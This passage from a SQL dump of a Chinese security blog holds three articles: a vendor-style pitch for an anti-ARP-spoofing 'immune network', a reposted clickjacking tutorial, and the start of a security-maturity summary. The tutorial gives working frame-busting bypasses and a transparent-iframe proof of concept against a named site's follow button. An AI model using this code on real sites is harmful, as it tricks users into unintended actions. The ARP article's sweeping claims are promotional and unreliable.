style=\"font-family:宋体;font-size:16px;\"><br /></span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">道高一尺魔高一丈，网络问题必定需要网络的方法去解决。目前，欣全向推广的免疫网络就是彻底解决ARP问题的最实际的方法。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">从技术原理上，彻底解决ARP欺骗和攻击，要有三个技术要点。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">1</span><span style=\"font-family:宋体;font-size:16px;\">、终端对网关的绑定要坚实可靠，这个绑定能够抵制被病毒捣毁。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">2</span><span style=\"font-family:宋体;font-size:16px;\">、接入路由器或网关要对下面终端IP-MAC的识别始终保证唯一准确。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br />3</span><span style=\"font-family:宋体;font-size:16px;\">、网络内要有一个最可依赖的机构，提供对网关IP-MAC最强大的保护。它既能够分发正确的网关信息，又能够对出现的假网关信息立即封杀。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">免疫网络在这三个问题上，都有专门的技术解决手段，而且这些技术都是厂家欣全向的技术专利。下面我们会详细说明。现在，我们要先做一个免疫网络结构和实施的简单介绍。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">免疫网络就是在现有的路由器、交换机、网卡、网线构成的普通交换网络基础上，加入一套安全和管理的解决方案。这样一来，在普通的网络通信中，就融合进了安全和管理的机制，保证了在网络通信过程中具有了安全管控的能力，堵上了普通网络对安全从不设防的先天漏洞。</span></p><br /><p style=\"text-align:center;\"><span style=\"font-family:宋体;font-size:16px;\"></span><span style=\"font-family:宋体;font-size:16px;\"></span></p><br /><p style=\"text-align:center;\"><span style=\"font-family:宋体;font-size:16px;\"><img border=\"0\" src=\"/static/uploadImage/1362387337100.jpg\" width=\"500\" height=\"314\" /></span></p><br /><p style=\"text-align:center;\"><span style=\"font-family:宋体;font-size:16px;\">免疫网络的结构</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">实施一个免疫网络不是一个很复杂的事，代价并不大。它要做的仅仅是用免疫墙路由器或免疫网关，替换掉现有的宽带接入设备。在免疫墙路由器下，需要自备一台服务器24小时运行免疫运营中心。免疫网关不需要，已自带服务器。这就是方案的所需要的硬件调整措施。</span></p><br /><p style=\"text-align:left;\"><br /><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">软性的网络调整是IP规划、分组策略、终端自动安装上网驱动等配置和安装工作，以保证整个的安全管理功能有效地运行。其实这部分工作和网管员对网络日常的管理没有太大区别。</span></p><br /><p style=\"text-align:center;\"><span style=\"font-family:宋体;font-size:16px;\"></span></p><br /><p style=\"text-align:center;\"><span style=\"font-family:宋体;font-size:16px;\"><img border=\"0\" src=\"/static/uploadImage/1362387340157.jpg\" width=\"600\" height=\"488\" /></span></p><br /><p style=\"text-align:center;\"><span style=\"font-family:宋体;font-size:16px;\">免疫网络的监控中心</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">免疫网络具有强大的网络基础安全和管理功能，对ARP的防范仅是其十分之一不到的能力。但本文谈的是ARP问题，所以我们需要回过头来，具体地解释免疫网络对ARP欺骗和攻击防范的机理。至于免疫网络更多的强大，可以后续研究。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">前述治理ARP问题的三个技术要点，终端绑定、网关、机构三个环节，免疫网络分别采用了专门的技术手段。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">1、<br /></span><span style=\"font-family:宋体;font-size:16px;\">终端绑定采用了看守式绑定技术。免疫网络需要每一台终端自动安装驱动，不安装或卸载就不能上网。在驱动中的看守式绑定，就是把正确的网关信息存贮在非公开的位置加以保护，任何对网关信息的更改，由于看守程序的严密监控，都是不能成功的，这就完成了对终端绑定牢固可靠的要求。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">2、<br /></span><span style=\"font-family:宋体;font-size:16px;\">免疫墙路由器或免疫网关的ARP先天免疫技术。在NAT转发过程中，由于加入了特殊的机制，免疫墙路由器根本不理会任何对终端IP-MAC的ARP申告，也就是说，谁都无法欺骗网关。与其他路由器不同，免疫墙路由器没有使用IP-MAC的列表进行工作，当然也不需要繁琐的路由器IP-MAC表绑定和维护操作。先天免疫，就是不用管也具有这个能力。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">3、<br /></span><span style=\"font-family:宋体;font-size:16px;\">保证网关IP-MAC始终正确的机构，在免疫网络中是一套安全机制。首先，它能够做到把从路由器中取到的真实网关信息，分发到每一个网内终端，而安装有驱动的终端，只接受这样的信息，其他信息不能接受，保证了网关的唯一正确性。其次，在每一台终端，免疫驱动都会拦截病毒发出的错误网关传播，不使其流窜到网络内，把ARP欺骗和攻击从根源上切断。</span></p><br /><span style=\"font-family:宋体;font-size:16px;\"><p style=\"text-align:left;\"><br /></p></span><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">从以上三个措施来看，免疫网络确实真正解决了困扰已久的ARP问题，技术上是严谨的，应用上是可行的，成本也是相对低廉。所以，与常见的四种ARP防范办法比较，免疫网络是解决ARP最根本的办法。</span></p><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"></span> </p><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"></span> </p><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">原文地址：<a href=\"http://bbs.51cto.com/viewthread.php?tid=698162\">http://bbs.51cto.com/viewthread.php?tid=698162</a></span></p><p> </p>', 'shack2', '661', '1', '0', '127.0.0.1', '2013-03-04 16:56:38', '1', '1');
INSERT INTO articleinfo VALUES ('200', '1', '7', '猥琐流之”关注我吧”', '<div class=\"post_content\"><p>文/sogili &nbsp; 来源：<a href=\"http://pkav.net/2013/01/341.html\">http://pkav.net/2013/01/341.html</a></p><p> </p><p>主要说一下问世多年缺一直没被重视的”点击劫持”.</p><p><strong>应用场景:</strong><br />1.社区的<strong>关注功能</strong>,在WEB2.0时代”关注我”已经成为一个社区必备功能,被关注的愈多在社区的影响力往往也愈大.</p><p><strong>点击劫持科普:</strong><br />简单来说就是在一个网页内再嵌入一个要攻击的网站,把这个嵌入的网站设置为透明,然后再上面覆盖一层东西,让你点到他想要你点到的位置,而实际上你点击的确实被嵌入的网站,这样就完成了一次点击劫持攻击.</p><p><strong>防嵌入?怎么破?</strong><br />因为”点击劫持”已经问世很多年,所以主流的浏览器基本上都提供的防御方案.<br />1.X-Frame-Options http响应头<br />三个选项:<br />(1)DENY : 不允许被任何网站嵌入.<br />(2)SAMEORIGIN : 允许被同源的网站嵌入.<br />(3)ALLOW-FROM uri : uri为一个指定的地址,仅允许这个uri嵌入.<br />对于用这个办法防御的网站来说没有什么好办法,但ie低版本并不支持.</p><p>2.FrameBusting<br />简单来说就是用JS来检测是否被嵌入.<br />经典的framebuting代码:<br /><code>if (top.location !== self.location) top.location=self.location;</code><br />对于这种<strong>framebuting还是可以hacking下</strong>的:<br />1.IE下的突破方法:<br /><code>if(self.ActiveXObject)var location={};</code><br />2.Chrome下的突破方法,不过偶尔会失效,因为是利用时间竞争来突破的:<br /><code>if(self.chrome)setInterval(&#39;location=&quot;javascript:void(0)&quot;&#39;);//Chrome</code><br />乌云正好是用的这种经典framebusting,所以这里用乌云做个范例.</p><p><strong>乌云”关注我”功能的POC:</strong><br /><code>&lt;script&gt;<br />var xx=200;<br />var yy=200;<br />window.onload=function (e){<br />var iframe = document.getElementById(&#39;xxx&#39;);<br />var e = e||window.event;</code></p><p>var x=e.clientX+document.body.scrollLeft+document.documentElement.scrollLeft;<br />var y=e.clientY+document.body.scrollTop+document.documentElement.scrollTop;</p><p>iframe.style.left=a.offsetLeft-xx;<br />iframe.style.top=a.offsetTop-yy;<br />}</p><p>&lt;/script&gt;<br />&lt;script&gt;<br />if(self.ActiveXObject)var location={};//IE<br />if(self.chrome)setInterval(‘location=”javascript:void(0)”‘);//Chrome<br />&lt;/script&gt;<br />&lt;iframe style=”position:absolute;opacity: 0.5;filter:alpha(opacity=50);z-index:1;” id=xxx src=”http://www.wooyun.org/whitehats/Sogili” WIDTH=60% height=500&gt;&lt;/iframe&gt;<br />&lt;br&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;&lt;/br&gt;&lt;center&gt;&lt;button id=a&gt;点击&lt;/button&gt;&lt;/center&gt;<br />自己用的话调下iframe的地址,宽高和xx,yy这个两个变量的值就好.</p></div><p> </p>', 'shack2', '979', '1', '0', '127.0.0.1', '2013-03-04 16:58:45', '1', '1');
INSERT INTO articleinfo VALUES ('201', '1', '7', '一位信息安全从业者的工作总结', '<p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"color:#009900\"><strong style=\"margin:0px;padding:0px;\"></strong></span></p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"color:#009900\"><strong style=\"margin:0px;padding:0px;\">经过了凤凰网以及完美世界开发工作的锻炼，对于安全开发工作有了一些很好的认识，下面总结一下过去的经验和教训。</strong></span></p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\">对于安全开发一定要有一套成熟度模型，例如公司刚开始做的时候定义的级别可以低一些，可做的事情要少一些。但是随着熟练程度的增加以及大家对于安全开发的理解的加深，逐步加深高级别的安全成熟度模型。</p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\">下面就简单介绍一下<span style=\"color:#ff9900\">我心中的成熟度模型的相关控制</span>，未分级大家可以依靠公司自己的特性来进行补充。</span></p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\"><strong style=\"margin:0px;padding:0px;\"><br style=\"margin:0px;padding:0px;\" /></strong></span></p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\"><strong style=\"margin:0px;padding:0px;\">1. 管理安全控制</strong></span></p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\">1.1 建立安全职责，目标就是组织中都明确自己的职责和责任</span><br style=\"margin:0px;padding:0px;\" /><span style=\"margin:0px;padding:0px;line-height:1.5;\"><strong style=\"margin:0px;padding:0px;\">工作内容：</strong></span></p><pre class=\"prettyprint lang-html prettyprinted\" style=\"margin:5px;padding:10px;border-width:0px 0px 0px 3px;border-left-style:solid;border-left-color:#cccccc;font-size:13px;font-family:consolas, monaco, &#39;bitstream vera sans mono&#39;, &#39;courier new&#39;, courier, monospace;overflow:auto;background-color:#f8f8f8;word-wrap:break-word;color:#666666;line-height:22px;\"><span class=\"pln\" style=\"color:#000000\">a) 组织安全机构组织架构图例如信息安全委员会等等，这里一定要注意安全机构一定级别足够的高，例如属于董事会或者CEO下面b) 文档化安全角色，职责，责任以及授予什么样的权限</span></pre><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\">1.2 管理安全配置</p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\"><strong style=\"margin:0px;padding:0px;\">工作内容:</strong></span></p><pre class=\"prettyprint lang-html prettyprinted\" style=\"margin:5px;padding:10px;border-width:0px 0px 0px 3px;border-left-style:solid;border-left-color:#cccccc;font-size:13px;font-family:consolas, monaco, &#39;bitstream vera sans mono&#39;, &#39;courier new&#39;, courier, monospace;overflow:auto;background-color:#f8f8f8;word-wrap:break-word;color:#666666;line-height:22px;\"><span class=\"pln\" style=\"color:#000000\">a)系统中所有软件的更新记录，保证出现问题可以很快的追踪到相对应的版本以及回退b)系统中所有问题的bug记录以及安全问题记录这样可以很好的知道现有系统所存在的风险</span></pre><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\">1.3 安全意识、培训</p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><strong style=\"margin:0px;padding:0px;\">工作内容:</strong></p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\"></span></p><pre class=\"prettyprint lang-html prettyprinted\" style=\"margin:5px;padding:10px;border-width:0px 0px 0px 3px;border-left-style:solid;border-left-color:#cccccc;font-size:13px;font-family:consolas, monaco, &#39;bitstream vera sans mono&#39;, &#39;courier new&#39;, courier, monospace;overflow:auto;background-color:#f8f8f8;word-wrap:break-word;color:#666666;line-height:22px;\"><span class=\"pln\" style=\"color:#000000\">a) 安全意识、培训的内容的有效性b)跟踪用户对于培训和意识课程的理解c)培训以及安全意识课程的资料收集，一定要来源与内部，当然也可以来源于外面的安全事件</span></pre><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><span style=\"margin:0px;padding:0px;line-height:1.5;\">1.4 管理安全列表</span></p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><strong style=\"margin:0px;padding:0px;\">工作内容:</strong></p><pre class=\"prettyprint lang-html prettyprinted\" style=\"margin:5px;padding:10px;border-width:0px 0px 0px 3px;border-left-style:solid;border-left-color:#cccccc;font-size:13px;font-family:consolas, monaco, &#39;bitstream vera sans mono&#39;, &#39;courier new&#39;, courier, monospace;overflow:auto;background-color:#f8f8f8;word-wrap:break-word;color:#666666;line-height:22px;\"><span class=\"pln\" style=\"color:#000000\">a) 收集维护以及各个系统的日志b) 敏感资产的详细清单c) 安全控制失效的原因以及解决方案</span></pre><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\">1.5 &nbsp;风险评估</p><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><strong style=\"margin:0px;padding:0px;\">工作内容：</strong></p><pre class=\"prettyprint lang-html prettyprinted\" style=\"margin:5px;padding:10px;border-width:0px 0px 0px 3px;border-left-style:solid;border-left-color:#cccccc;font-size:13px;font-family:consolas, monaco, &#39;bitstream vera sans mono&#39;, &#39;courier new&#39;, courier, monospace;overflow:auto;background-color:#f8f8f8;word-wrap:break-word;color:#666666;line-height:22px;\"><span class=\"pln\" style=\"color:#000000\">a) 识别安全运维过程中的风险b) 识别安全开发过程中的风险c) 定义组织内统一的安全度量标准</span></pre><p style=\"padding:6px 0px 4px;float:left;width:638px;overflow:hidden;color:#666666;font-family:verdana, geneva, sans-serif, 微软雅黑;font-size:12px;line-height:22px;background-color:#ffffff;margin-top:0px;margin-bottom:0px;\"><strong style=\"margin:0px;padding:0px;\"><br style=\"margin:0px;padding:0px;\" /></strong></p><p style=\